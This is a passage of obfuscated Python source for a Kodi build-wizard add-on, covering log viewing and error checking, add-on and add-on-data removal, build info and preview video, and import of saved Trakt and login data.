		OOO000OO00O0000O0 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0OO0OO0O00OOO00O )))#line:4161
		OOO000OO00O0000O0 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0OO0OO0O00OOO00O )))#line:4162
		OOO000OO00O0000O0 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0OO0OO0O00OOO00O )))#line:4163
		OOO000OO00O0000O0 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0OO0OO0O00OOO00O )))#line:4164
	OOO000OO00O0000O0 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4165
	return OOO000OO00O0000O0 #line:4166
def toggleCache (O0O0OOO0O0O0O00OO ):#line:4168
	OO00O00OO0OO000OO =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4169
	OO0O0000OOOOO0OO0 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4170
	if O0O0OOO0O0O0O00OO in ['true','false']:#line:4171
		for OOOOO00O0O0O000OO in OO00O00OO0OO000OO :#line:4172
			wiz .setS (OOOOO00O0O0O000OO ,O0O0OOO0O0O0O00OO )#line:4173
	else :#line:4174
		if not O0O0OOO0O0O0O00OO in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4175
			try :#line:4176
				OOOOO00O0O0O000OO =OO0O0000OOOOO0OO0 [OO00O00OO0OO000OO .index (O0O0OOO0O0O0O00OO )]#line:4177
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OOOOO00O0O0O000OO ))#line:4178
			except :#line:4179
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O0O0OOO0O0O0O00OO ))#line:4180
		else :#line:4181
			O0000O0OO00O00O0O ='true'if wiz .getS (O0O0OOO0O0O0O00OO )=='false'else 'false'#line:4182
			wiz .setS (O0O0OOO0O0O0O00OO ,O0000O0OO00O00O0O )#line:4183
def playVideo (O0OOO0O00OO00O00O ):#line:4185
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O0OOO0O00OO00O00O )#line:4186
	if 'watch?v='in O0OOO0O00OO00O00O :#line:4187
		OO00OOO0O0O0000OO ,O000OOO0000O0O0O0 =O0OOO0O00OO00O00O .split ('?')#line:4188
		OOO0000000000OOOO =O000OOO0000O0O0O0 .split ('&')#line:4189
		for O00OOOOO0O0O0OO00 in OOO0000000000OOOO :#line:4190
			if O00OOOOO0O0O0OO00 .startswith ('v='):#line:4191
				O0OOO0O00OO00O00O =O00OOOOO0O0O0OO00 [2 :]#line:4192
				break #line:4193
			else :continue #line:4194
	elif 'embed'in O0OOO0O00OO00O00O or 'youtu.be'in O0OOO0O00OO00O00O :#line:4195
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O0OOO0O00OO00O00O )#line:4196
		OO00OOO0O0O0000OO =O0OOO0O00OO00O00O .split ('/')#line:4197
		if len (OO00OOO0O0O0000OO [-1 ])>5 :#line:4198
			O0OOO0O00OO00O00O =OO00OOO0O0O0000OO [-1 ]#line:4199
		elif len (OO00OOO0O0O0000OO [-2 ])>5 :#line:4200
			O0OOO0O00OO00O00O =OO00OOO0O0O0000OO [-2 ]#line:4201
	wiz .log ("YouTube URL: %s"%O0OOO0O00OO00O00O )#line:4202
	yt .PlayVideo (O0OOO0O00OO00O00O )#line:4203
def viewLogFile ():#line:4205
	OOOO0O0000OO0O0OO =wiz .Grab_Log (True )#line:4206
	OO000O0O00O0O00OO =wiz .Grab_Log (True ,True )#line:4207
	OOO0O00000OO0000O =0 ;OO00O000O00000OOO =OOOO0O0000OO0O0OO #line:4208
	if not OO000O0O00O0O00OO ==False and not OOOO0O0000OO0O0OO ==False :#line:4209
		OOO0O00000OO0000O =DIALOG .select (ADDONTITLE ,["View %s"%OOOO0O0000OO0O0OO .replace (LOG ,""),"View %s"%OO000O0O00O0O00OO .replace (LOG ,"")])#line:4210
		if OOO0O00000OO0000O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4211
	elif OOOO0O0000OO0O0OO ==False and OO000O0O00O0O00OO ==False :#line:4212
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4213
		return #line:4214
	elif not OOOO0O0000OO0O0OO ==False :OOO0O00000OO0000O =0 #line:4215
	elif not OO000O0O00O0O00OO ==False :OOO0O00000OO0000O =1 #line:4216
	OO00O000O00000OOO =OOOO0O0000OO0O0OO if OOO0O00000OO0000O ==0 else OO000O0O00O0O00OO #line:4218
	O000OO000OOOOO0OO =wiz .Grab_Log (False )if OOO0O00000OO0000O ==0 else wiz .Grab_Log (False ,True )#line:4219
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OO00O000O00000OOO ),O000OO000OOOOO0OO )#line:4221
def errorChecking (log =None ,count =None ,all =None ):#line:4223
	if log ==None :#line:4224
		O0O0OOO00OO00OO0O =wiz .Grab_Log (True )#line:4225
		O00O0O0000000O0OO =wiz .Grab_Log (True ,True )#line:4226
		if not O00O0O0000000O0OO ==False and not O0O0OOO00OO00OO0O ==False :#line:4227
			O0OOO00O000000O0O =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0O0OOO00OO00OO0O .replace (LOG ,""),errorChecking (O0O0OOO00OO00OO0O ,True ,True )),"View %s: %s error(s)"%(O00O0O0000000O0OO .replace (LOG ,""),errorChecking (O00O0O0000000O0OO ,True ,True ))])#line:4228
			if O0OOO00O000000O0O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4229
		elif O0O0OOO00OO00OO0O ==False and O00O0O0000000O0OO ==False :#line:4230
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4231
			return #line:4232
		elif not O0O0OOO00OO00OO0O ==False :O0OOO00O000000O0O =0 #line:4233
		elif not O00O0O0000000O0OO ==False :O0OOO00O000000O0O =1 #line:4234
		log =O0O0OOO00OO00OO0O if O0OOO00O000000O0O ==0 else O00O0O0000000O0OO #line:4235
	if log ==False :#line:4236
		if count ==None :#line:4237
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4238
			return False #line:4239
		else :#line:4240
			return 0 #line:4241
	else :#line:4242
		if os .path .exists (log ):#line:4243
			O00OOOO000O00O0OO =open (log ,mode ='r');OOO000OOO000000OO =O00OOOO000O00O0OO .read ().replace ('\n','').replace ('\r','');O00OOOO000O00O0OO .close ()#line:4244
			OOO0OOO00OO0OO0OO =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOO000OOO000000OO )#line:4245
			if not count ==None :#line:4246
				if all ==None :#line:4247
					OOOOO0000OOOOOO00 =0 #line:4248
					for O0O0OOO0OO0O0O000 in OOO0OOO00OO0OO0OO :#line:4249
						if ADDON_ID in O0O0OOO0OO0O0O000 :OOOOO0000OOOOOO00 +=1 #line:4250
					return OOOOO0000OOOOOO00 #line:4251
				else :return len (OOO0OOO00OO0OO0OO )#line:4252
			if len (OOO0OOO00OO0OO0OO )>0 :#line:4253
				OOOOO0000OOOOOO00 =0 ;OOO00OOO0OOO00OOO =""#line:4254
				for O0O0OOO0OO0O0O000 in OOO0OOO00OO0OO0OO :#line:4255
					if all ==None and not ADDON_ID in O0O0OOO0OO0O0O000 :continue #line:4256
					else :#line:4257
						OOOOO0000OOOOOO00 +=1 #line:4258
						OOO00OOO0OOO00OOO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOOOO0000OOOOOO00 ,O0O0OOO0OO0O0O000 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4259
				if OOOOO0000OOOOOO00 >0 :#line:4260
					wiz .TextBox (ADDONTITLE ,OOO00OOO0OOO00OOO )#line:4261
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4262
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4263
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4264
ACTION_PREVIOUS_MENU =10 #line:4266
ACTION_NAV_BACK =92 #line:4267
ACTION_MOVE_LEFT =1 #line:4268
ACTION_MOVE_RIGHT =2 #line:4269
ACTION_MOVE_UP =3 #line:4270
ACTION_MOVE_DOWN =4 #line:4271
ACTION_MOUSE_WHEEL_UP =104 #line:4272
ACTION_MOUSE_WHEEL_DOWN =105 #line:4273
ACTION_MOVE_MOUSE =107 #line:4274
ACTION_SELECT_ITEM =7 #line:4275
ACTION_BACKSPACE =110 #line:4276
ACTION_MOUSE_LEFT_CLICK =100 #line:4277
ACTION_MOUSE_LONG_CLICK =108 #line:4278
def LogViewer (default =None ):#line:4280
	class OOO000OOO0OO00O0O (xbmcgui .WindowXMLDialog ):#line:4281
		def __init__ (OO0O00OO0O0O0000O ,*O00OO0000OO0OOOOO ,**OO0O000O0000OOOOO ):#line:4282
			OO0O00OO0O0O0000O .default =OO0O000O0000OOOOO ['default']#line:4283
		def onInit (O0OOOO0O00OOOOO0O ):#line:4285
			O0OOOO0O00OOOOO0O .title =101 #line:4286
			O0OOOO0O00OOOOO0O .msg =102 #line:4287
			O0OOOO0O00OOOOO0O .scrollbar =103 #line:4288
			O0OOOO0O00OOOOO0O .upload =201 #line:4289
			O0OOOO0O00OOOOO0O .kodi =202 #line:4290
			O0OOOO0O00OOOOO0O .kodiold =203 #line:4291
			O0OOOO0O00OOOOO0O .wizard =204 #line:4292
			O0OOOO0O00OOOOO0O .okbutton =205 #line:4293
			O00O0OOOOO0OOO00O =open (O0OOOO0O00OOOOO0O .default ,'r')#line:4294
			O0OOOO0O00OOOOO0O .logmsg =O00O0OOOOO0OOO00O .read ()#line:4295
			O00O0OOOOO0OOO00O .close ()#line:4296
			O0OOOO0O00OOOOO0O .titlemsg ="%s: %s"%(ADDONTITLE ,O0OOOO0O00OOOOO0O .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4297
			O0OOOO0O00OOOOO0O .showdialog ()#line:4298
		def showdialog (O00O0O0OO0O0O000O ):#line:4300
			O00O0O0OO0O0O000O .getControl (O00O0O0OO0O0O000O .title ).setLabel (O00O0O0OO0O0O000O .titlemsg )#line:4301
			O00O0O0OO0O0O000O .getControl (O00O0O0OO0O0O000O .msg ).setText (wiz .highlightText (O00O0O0OO0O0O000O .logmsg ))#line:4302
			O00O0O0OO0O0O000O .setFocusId (O00O0O0OO0O0O000O .scrollbar )#line:4303
		def onClick (O00OOO0O0OOOOO000 ,OO0000O00O0O0OO0O ):#line:4305
			if OO0000O00O0O0OO0O ==O00OOO0O0OOOOO000 .okbutton :O00OOO0O0OOOOO000 .close ()#line:4306
			elif OO0000O00O0O0OO0O ==O00OOO0O0OOOOO000 .upload :O00OOO0O0OOOOO000 .close ();uploadLog .Main ()#line:4307
			elif OO0000O00O0O0OO0O ==O00OOO0O0OOOOO000 .kodi :#line:4308
				OOOO00OO00OOOOOOO =wiz .Grab_Log (False )#line:4309
				O0O0O0000OOOO00O0 =wiz .Grab_Log (True )#line:4310
				if OOOO00OO00OOOOOOO ==False :#line:4311
					O00OOO0O0OOOOO000 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4312
					O00OOO0O0OOOOO000 .getControl (O00OOO0O0OOOOO000 .msg ).setText ("Log File Does Not Exists!")#line:4313
				else :#line:4314
					O00OOO0O0OOOOO000 .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0O0000OOOO00O0 .replace (LOG ,''))#line:4315
					O00OOO0O0OOOOO000 .getControl (O00OOO0O0OOOOO000 .title ).setLabel (O00OOO0O0OOOOO000 .titlemsg )#line:4316
					O00OOO0O0OOOOO000 .getControl (O00OOO0O0OOOOO000 .msg ).setText (wiz .highlightText (OOOO00OO00OOOOOOO ))#line:4317
					O00OOO0O0OOOOO000 .setFocusId (O00OOO0O0OOOOO000 .scrollbar )#line:4318
			elif OO0000O00O0O0OO0O ==O00OOO0O0OOOOO000 .kodiold :#line:4319
				OOOO00OO00OOOOOOO =wiz .Grab_Log (False ,True )#line:4320
				O0O0O0000OOOO00O0 =wiz .Grab_Log (True ,True )#line:4321
				if OOOO00OO00OOOOOOO ==False :#line:4322
					O00OOO0O0OOOOO000 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4323
					O00OOO0O0OOOOO000 .getControl (O00OOO0O0OOOOO000 .msg ).setText ("Log File Does Not Exists!")#line:4324
				else :#line:4325
					O00OOO0O0OOOOO000 .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0O0000OOOO00O0 .replace (LOG ,''))#line:4326
					O00OOO0O0OOOOO000 .getControl (O00OOO0O0OOOOO000 .title ).setLabel (O00OOO0O0OOOOO000 .titlemsg )#line:4327
					O00OOO0O0OOOOO000 .getControl (O00OOO0O0OOOOO000 .msg ).setText (wiz .highlightText (OOOO00OO00OOOOOOO ))#line:4328
					O00OOO0O0OOOOO000 .setFocusId (O00OOO0O0OOOOO000 .scrollbar )#line:4329
			elif OO0000O00O0O0OO0O ==O00OOO0O0OOOOO000 .wizard :#line:4330
				OOOO00OO00OOOOOOO =wiz .Grab_Log (False ,False ,True )#line:4331
				O0O0O0000OOOO00O0 =wiz .Grab_Log (True ,False ,True )#line:4332
				if OOOO00OO00OOOOOOO ==False :#line:4333
					O00OOO0O0OOOOO000 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4334
					O00OOO0O0OOOOO000 .getControl (O00OOO0O0OOOOO000 .msg ).setText ("Log File Does Not Exists!")#line:4335
				else :#line:4336
					O00OOO0O0OOOOO000 .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0O0000OOOO00O0 .replace (ADDONDATA ,''))#line:4337
					O00OOO0O0OOOOO000 .getControl (O00OOO0O0OOOOO000 .title ).setLabel (O00OOO0O0OOOOO000 .titlemsg )#line:4338
					O00OOO0O0OOOOO000 .getControl (O00OOO0O0OOOOO000 .msg ).setText (wiz .highlightText (OOOO00OO00OOOOOOO ))#line:4339
					O00OOO0O0OOOOO000 .setFocusId (O00OOO0O0OOOOO000 .scrollbar )#line:4340
		def onAction (OOO0OOO00O0O0OO00 ,O0OO00OO00OOOOO00 ):#line:4342
			if O0OO00OO00OOOOO00 ==ACTION_PREVIOUS_MENU :OOO0OOO00O0O0OO00 .close ()#line:4343
			elif O0OO00OO00OOOOO00 ==ACTION_NAV_BACK :OOO0OOO00O0O0OO00 .close ()#line:4344
	if default ==None :default =wiz .Grab_Log (True )#line:4345
	OO000O0O00OOOOO00 =OOO000OOO0OO00O0O ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4346
	OO000O0O00OOOOO00 .doModal ()#line:4347
	del OO000O0O00OOOOO00 #line:4348
def removeAddon (O0O0OOO0O0O00OO0O ,O0OO00O000OO0OO0O ,over =False ):#line:4350
	if not over ==False :#line:4351
		OOOO000OO00000000 =1 #line:4352
	else :#line:4353
		OOOO000OO00000000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO00O000OO0OO0O ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O0O0OOO0O0O00OO0O ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4354
	if OOOO000OO00000000 ==1 :#line:4355
		O0000OOOOOO0O00OO =os .path .join (ADDONS ,O0O0OOO0O0O00OO0O )#line:4356
		wiz .log ("Removing Addon %s"%O0O0OOO0O0O00OO0O )#line:4357
		wiz .cleanHouse (O0000OOOOOO0O00OO )#line:4358
		xbmc .sleep (1000 )#line:4359
		try :shutil .rmtree (O0000OOOOOO0O00OO )#line:4360
		except Exception as OO0OO0O0O00OO00OO :wiz .log ("Error removing %s"%O0O0OOO0O0O00OO0O ,xbmc .LOGNOTICE )#line:4361
		removeAddonData (O0O0OOO0O0O00OO0O ,O0OO00O000OO0OO0O ,over )#line:4362
	if over ==False :#line:4363
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O0OO00O000OO0OO0O ))#line:4364
def removeAddonData (OO0O0OO0O0O0000OO ,name =None ,over =False ):#line:4366
	if OO0O0OO0O0O0000OO =='all':#line:4367
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4368
			wiz .cleanHouse (ADDOND )#line:4369
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4370
	elif OO0O0OO0O0O0000OO =='uninstalled':#line:4371
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4372
			O0OO00O0O00OOO00O =0 #line:4373
			for O0OOO000OO0O0O00O in glob .glob (os .path .join (ADDOND ,'*')):#line:4374
				OO00O0OOOO0OOO00O =O0OOO000OO0O0O00O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4375
				if OO00O0OOOO0OOO00O in EXCLUDES :pass #line:4376
				elif os .path .exists (os .path .join (ADDONS ,OO00O0OOOO0OOO00O )):pass #line:4377
				else :wiz .cleanHouse (O0OOO000OO0O0O00O );O0OO00O0O00OOO00O +=1 ;wiz .log (O0OOO000OO0O0O00O );shutil .rmtree (O0OOO000OO0O0O00O )#line:4378
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0OO00O0O00OOO00O ))#line:4379
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4380
	elif OO0O0OO0O0O0000OO =='empty':#line:4381
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4382
			O0OO00O0O00OOO00O =wiz .emptyfolder (ADDOND )#line:4383
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0OO00O0O00OOO00O ))#line:4384
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4385
	else :#line:4386
		O00OO0OO00OO00OOO =os .path .join (USERDATA ,'addon_data',OO0O0OO0O0O0000OO )#line:4387
		if OO0O0OO0O0O0000OO in EXCLUDES :#line:4388
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4389
		elif os .path .exists (O00OO0OO00OO00OOO ):#line:4390
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O0OO0O0O0000OO ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4391
				wiz .cleanHouse (O00OO0OO00OO00OOO )#line:4392
				try :#line:4393
					shutil .rmtree (O00OO0OO00OO00OOO )#line:4394
				except :#line:4395
					wiz .log ("Error deleting: %s"%O00OO0OO00OO00OOO )#line:4396
			else :#line:4397
				wiz .log ('Addon data for %s was not removed'%OO0O0OO0O0O0000OO )#line:4398
	wiz .refresh ()#line:4399
def restoreit (OO0OO0O0OO00OOO00 ):#line:4401
	if OO0OO0O0OO00OOO00 =='build':#line:4402
		OOOO000O00OOO0OOO =freshStart ('restore')#line:4403
		if OOOO000O00OOO0OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4404
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4405
		wiz .skinToDefault ()#line:4406
	wiz .restoreLocal (OO0OO0O0OO00OOO00 )#line:4407
def restoreextit (OO0O000O0OO00O0O0 ):#line:4409
	if OO0O000O0OO00O0O0 =='build':#line:4410
		OO0OOO0O00OO0O000 =freshStart ('restore')#line:4411
		if OO0OOO0O00OO0O000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4412
	wiz .restoreExternal (OO0O000O0OO00O0O0 )#line:4413
def buildInfo (O00O0OOO0OOO000OO ):#line:4415
	if wiz .workingURL (SPEEDFILE )==True :#line:4416
		if wiz .checkBuild (O00O0OOO0OOO000OO ,'url'):#line:4417
			O00O0OOO0OOO000OO ,O00O00000O00OOOOO ,OO0OO0000OOOO0000 ,OOOOOO00OOO000OO0 ,O0000O0OOOO00O0OO ,OO000OOOOOO0O0O0O ,O00000O0O0O000000 ,OOOO00OOO000OO0OO ,OOOOOOOO0O0O00O00 ,O00O0OOO0O00O00O0 ,O0000O0O00O00000O =wiz .checkBuild (O00O0OOO0OOO000OO ,'all')#line:4418
			O00O0OOO0O00O00O0 ='Yes'if O00O0OOO0O00O00O0 .lower ()=='yes'else 'No'#line:4419
			O0O00O00O00OOOOOO ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O0OOO0OOO000OO )#line:4420
			O0O00O00O00OOOOOO +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O00000O00OOOOO )#line:4421
			if not OO000OOOOOO0O0O0O =="http://":#line:4422
				O0OO0OOOO000OOO0O =wiz .themeCount (O00O0OOO0OOO000OO ,False )#line:4423
				O0O00O00O00OOOOOO +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O0OO0OOOO000OOO0O ))#line:4424
			O0O00O00O00OOOOOO +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0000O0OOOO00O0OO )#line:4425
			O0O00O00O00OOOOOO +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O0OOO0O00O00O0 )#line:4426
			O0O00O00O00OOOOOO +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0000O0O00O00000O )#line:4427
			wiz .TextBox (ADDONTITLE ,O0O00O00O00OOOOOO )#line:4428
		else :wiz .log ("Invalid Build Name!")#line:4429
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4430
def buildVideo (O0OOO000OO0O0OOOO ):#line:4432
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4433
	if wiz .workingURL (SPEEDFILE )==True :#line:4434
		OOO0O00OOO000000O =wiz .checkBuild (O0OOO000OO0O0OOOO ,'preview')#line:4435
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O0OOO000OO0O0OOOO )#line:4436
		if OOO0O00OOO000000O and not OOO0O00OOO000000O =='http://':playVideo (OOO0O00OOO000000O )#line:4437
		else :wiz .log ("[%s]Unable to find url for video preview"%O0OOO000OO0O0OOOO )#line:4438
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4439
def dependsList (OO0O00O00OO0OOO00 ):#line:4441
	O0000OO000OO00OOO =os .path .join (ADDONS ,OO0O00O00OO0OOO00 ,'addon.xml')#line:4442
	if os .path .exists (O0000OO000OO00OOO ):#line:4443
		OOO0O000O00O00000 =open (O0000OO000OO00OOO ,mode ='r');OO0000OO0OOO0OOOO =OOO0O000O00O00000 .read ();OOO0O000O00O00000 .close ();#line:4444
		OO00O00000O00OO0O =wiz .parseDOM (OO0000OO0OOO0OOOO ,'import',ret ='addon')#line:4445
		OOO0OOOO0000OOOOO =[]#line:4446
		for O0OOOO00OOOOOO0O0 in OO00O00000O00OO0O :#line:4447
			if not 'xbmc.python'in O0OOOO00OOOOOO0O0 :#line:4448
				OOO0OOOO0000OOOOO .append (O0OOOO00OOOOOO0O0 )#line:4449
		return OOO0OOOO0000OOOOO #line:4450
	return []#line:4451
def manageSaveData (OOO000OOO0O00OOO0 ):#line:4453
	if OOO000OOO0O00OOO0 =='import':#line:4454
		O000OOOOOO0O0O0O0 =os .path .join (ADDONDATA ,'temp')#line:4455
		if not os .path .exists (O000OOOOOO0O0O0O0 ):os .makedirs (O000OOOOOO0O0O0O0 )#line:4456
		O0OOO0000OO0O0OOO =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4457
		if not O0OOO0000OO0O0OOO .endswith ('.zip'):#line:4458
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4459
			return #line:4460
		OOO0OOOOO0000OOOO =os .path .join (MYBUILDS ,'SaveData.zip')#line:4461
		O000O0OO0O0O000OO =xbmcvfs .copy (O0OOO0000OO0O0OOO ,OOO0OOOOO0000OOOO )#line:4462
		wiz .log ("%s"%str (O000O0OO0O0O000OO ))#line:4463
		extract .all (xbmc .translatePath (OOO0OOOOO0000OOOO ),O000OOOOOO0O0O0O0 )#line:4464
		O0000O0O0O0O00OOO =os .path .join (O000OOOOOO0O0O0O0 ,'trakt')#line:4465
		O0O0000O000OO0000 =os .path .join (O000OOOOOO0O0O0O0 ,'login')#line:4466
		O000O000O0O00O00O =os .path .join (O000OOOOOO0O0O0O0 ,'debrid')#line:4467
		O0000OOO000O0O0O0 =0 #line:4468
		if os .path .exists (O0000O0O0O0O00OOO ):#line:4469
			O0000OOO000O0O0O0 +=1 #line:4470
			OO0OO0O00O00O0OO0 =os .listdir (O0000O0O0O0O00OOO )#line:4471
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4472
			for O000000O0000000O0 in OO0OO0O00O00O0OO0 :#line:4473
				OOO00OOO0000O0O0O =os .path .join (traktit .TRAKTFOLD ,O000000O0000000O0 )#line:4474
				OOO0OOOOOOOO000OO =os .path .join (O0000O0O0O0O00OOO ,O000000O0000000O0 )#line:4475
				if os .path .exists (OOO00OOO0000O0O0O ):#line:4476
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O000000O0000000O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4477
					else :os .remove (OOO00OOO0000O0O0O )#line:4478
				shutil .copy (OOO0OOOOOOOO000OO ,OOO00OOO0000O0O0O )#line:4479
			traktit .importlist ('all')#line:4480
			traktit .traktIt ('restore','all')#line:4481
		if os .path .exists (O0O0000O000OO0000 ):#line:4482
			O0000OOO000O0O0O0 +=1 #line:4483
			OO0OO0O00O00O0OO0 =os .listdir (O0O0000O000OO0000 )#line:4484
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4485
			for O000000O0000000O0 in OO0OO0O00O00O0OO0 :#line:4486
				OOO00OOO0000O0O0O =os .path .join (loginit .LOGINFOLD ,O000000O0000000O0 )#line:4487
				OOO0OOOOOOOO000OO =os .path .join (O0O0000O000OO0000 ,O000000O0000000O0 )#line:4488
